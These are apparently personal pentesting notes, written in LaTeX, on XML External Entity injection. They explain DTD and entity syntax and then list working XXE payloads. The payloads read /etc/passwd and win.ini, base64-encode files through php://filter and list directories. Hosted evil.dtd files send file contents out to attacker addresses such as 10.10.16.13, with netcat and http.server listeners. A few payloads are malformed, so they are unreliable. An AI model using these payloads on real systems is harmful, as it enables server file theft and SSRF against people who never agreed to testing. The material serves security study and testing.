\chapter{External XML Entity}
\section{External XML Entity}
\subsection{introduction}
\subsection{Notes}
exflitrer vers du ftp
encodage base64 du fichier

\subsection{definitions}

\subsubsection{Document Type Definition (DTD)}

\textbf{\underline{inline}}:
\begin{verbatim}
<!DOCTYPE DTD_NAME [
    list of ENTITIY / ELEMENTS
]>
... XML DOCUMENT...
\end{verbatim}

\verb+DTD_NAME+ become the name of the root element of the XML

\textbf{\underline{external}}:
\begin{verbatim}
<!DOCTYPE DTD_NAME SYSTEM "URI">
... XML DOCUMENT...
\end{verbatim}

\subsubsection{Element}
Element type declarations set the rules for the type and number of elements that may appear in an XML document, what elements may appear inside each other, and what order they must appear in. For example:
\begin{itemize}
    \item \verb+<!ELEMENT name ANY>+ Means that any object could be inside the
        parent \verb+<name></name>+
    \item \verb+<!ELEMENT name EMPTY>+ 
\end{itemize}

\subsubsection{Entity}
entity can be  considered as variable and store data.  They are defined in \verb+DTD+

There are three types of entities:
\begin{itemize}
    \item General (\verb+<!ENTITY name "value">+): define some value referenced
        somewhere.
    \item parameter (\verb+<!ENTITY % name "value">+): \textbf{\underline{only
        allowed inside DTD}}, more
    flexible like entity having for value another entiry. Can only be
        referenced inside the DTD.
    \item predefined: like defining value for \verb+<+ (\verb+&#x3C;+)
\end{itemize}

External entities are entities which values are external ressource (local or
remote). The keyword \verb+SYSTEM+ allow to define an external entities for
which the value  can be : 
\begin{itemize}
    \item a file: \verb+file:///etc/passwd+
    \item an external URL: \verb+ "http://..."+, \verb+ftp://...+,\ldots
\end{itemize}

\textbf{\underline{Note}}: if the external ressource is close to an xml syntax
the XML parser will trhow an error if not properly managed (\verb+CDATA+)

\textbf{\underline{Declaration}}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE foo [
    <!ENTITY  name SYSTEM "value"> 
]>
\end{verbatim}

\textbf{\underline{Reference}}:
\begin{itemize}
    \item a general entity:   \verb+&name;+
    \item an external entity: \verb+%name;+ (but only in a DTD)
\end{itemize}

\textbf{\underline{Reference of parameter entity}}: in an internal DTD subset, parameter-entity references MUST NOT occur within
markup declaration.

this will work:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY % param "<!ENTITY  general 'pwned'>">
    %param;
]>
<pwn>&general;</pwn>
\end{verbatim}

But this will not worki (illegal parameter entity reference):
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY % ext1 "ext1">
    <!ENTITY % outer "<!ENTITY inner 'value of ext1 is %ext1;'>">
    %outer;
]>
<pwn>&inner;</pwn>
\end{verbatim}

it has to be done like this 
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil SYSTEM "URI">
<pwn>&inner;</pwn>
\end{verbatim}

inside evil.dtd
\begin{verbatim}
<!ENTITY % ext1 "ext1">
<!ENTITY % outer "<!ENTITY inner 'value of ext1 is %ext1;'>">
%outer;
\end{verbatim}


\subsection{Attacks}
Type of attacks :
\begin{itemize}
    \item inband : 
    \item ouoftband (\verb+ SYSTEM "http://<IP>:<PORT>"+ avec un netcat) allow
        SSRF (Server Side Request Forgery)
    \item error
\end{itemize}

\subsection{In Band}
\subsubsection{Identifying reflexion}
\underline{the request}:
\begin{verbatim}
<?xml version = "1.0"?>
<order>
    <quantity>a</quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}

\underline{the response}: 
\begin{verbatim}
Your order for Home Appliances has been processed
\end{verbatim}


\subsubsection{Test payload}
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ELEMENT order ANY>
    <!ENTITY payload "pwned"> 
]>
<order>
    <quantity>a</quantity>
    <item>&payload;</item>
    <address>a</address>
</order>
\end{verbatim}

\subsection{Out Of Band}
\subsubsection{Test}
start a receiving server (\verb+nc -lnvp 4444+)

\textbf{\underline{test 1}}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY & payload SYSTEM "http://MY-IP:4444"> 
    & payload;
]>
...
\end{verbatim}


\textbf{\underline{test 2}}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY payload SYSTEM "http://MY-IP:4444"> 
]>
<order>
    <quantity>&subscribe;</quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}


\subsubsection{file exfiltration}

\underline{command to launch the servers}:
\begin{verbatim}
python3 -m http.server 4444
nc -klnvp 4445
\end{verbatim}



\textbf{If file exfitration is not working try to test with} \verb+<!ENTITY % file "test">+


if the webserver is using PHP: 

\verb+<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">+

\textbf{\underline{solution 1}}

\underline{content of the evil.dtd}:
\begin{verbatim}
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://10.10.16.13:4445/?%file;'>">
%eval;
\end{verbatim}


\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE order SYSTEM "http://10.10.16.13:4444/evil.dtd"> 
<order>
    <quantity> &send; </quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}

Problem in windows multiline files. need to base64 encode it.

\textbf{\underline{solution 2}}:

define a hosted DTD
\begin{itemize}
    \item Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
    \item Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
    \item Uses the eval entity, which causes the dynamic declaration of the
        exfiltrate entity to be performed.
    \item Uses the exfiltrate entity, so that its value is evaluated by
        requesting the specified URL.
\end{itemize}

\underline{content of the evil.dtd}:
\begin{verbatim}
  <!ENTITY % file  SYSTEM "file:///etc/passwd"> 
  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM  'http://<URL>/?%file;'>"> 
  %eval; 
  %send;
\end{verbatim}

\underline{payload}:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % dtd SYSTEM "DTD-URL">
    %dtd;
]>
...
\end{verbatim}

\subsection{managing content problems}

\subsubsection{base64 encoding} 

if the webserver is using PHP: 

\verb+<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">+

\subsubsection{In band CDATA}

\verb+<![CDATA[+ ... \verb+]]>+


\textbf{\underline{Solution 1}}:

\underline{content of the evil.dtd}:
\begin{verbatim}
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % wrapper "<!ENTITY concat '%start;%passwd;%end;'>">
  %wrapper;
\end{verbatim}

\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE order SYSTEM "http://10.10.16.13:4444/evil.dtd">
<order>
    <quantity>a</quantity>
    <item>&concat;</item>
    <address>a</address>
</order>
\end{verbatim}


\textbf{\underline{Solution 2}}:

\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE foo [<
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % dtd SYSTEM "http://192.168.1.5:8000/evil.dtd" >
]>
<order>
    <quantity>a</quantity>
    <item>&wrapper;</item>
    <address>a</address>
</order>
\end{verbatim}

\underline{content of the evil.dtd}:
\begin{verbatim}
<!ENTITY wrapper "%start;%passwd;%end;">
\end{verbatim}

\subsubsection{Out of band CDATA}

first external DTD:

\begin{verbatim}
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % wrapper "<!ENTITY all '%start;%passwd;%end;'>"> 
  %wrapper;
\end{verbatim}

pour exfilter il faut definir une autre DTD qui va utiliser wrapper et qui sera
appellée par le payload
Pour exfiltrer il faut inclure une autre DTD et lui envoyer les données


\subsection{payloads}

\subsubsection{file reading}
\begin{verbatim}
<!ENTITY example SYSTEM "/etc/passwd">
<!ENTITY payload SYSTEM "file:///etc/passwd">
<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY payload SYSTEM 'file:///c:/windows/win.ini'>
\end{verbatim}

\subsubsection{directory listing}
In java based applications it might be possible to list the contents of a directory via XXE with a payload
\begin{verbatim}
<!ENTITY payload SYSTEM "file:///etc/">
<!ENTITY payload SYSTEM 'file:///c:/'>
\end{verbatim}

\subsection{Tools}
\begin{itemize}
    \item xxeinjector: Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods.
    \item xxeserv: 	A mini webserver with FTP support for XXE payloads.
    \item xxexploiter: It generates the XML payloads, and automatically starts a server to serve the needed DTD's or to do data exfiltration.
\end{itemize}
\subsection{links}
\begin{itemize}
    \item \url{https://www.youtube.com/watch?v=gjm6VHZa_8s}
    \item \url{https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity}
    \item \url{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md}
\end{itemize}
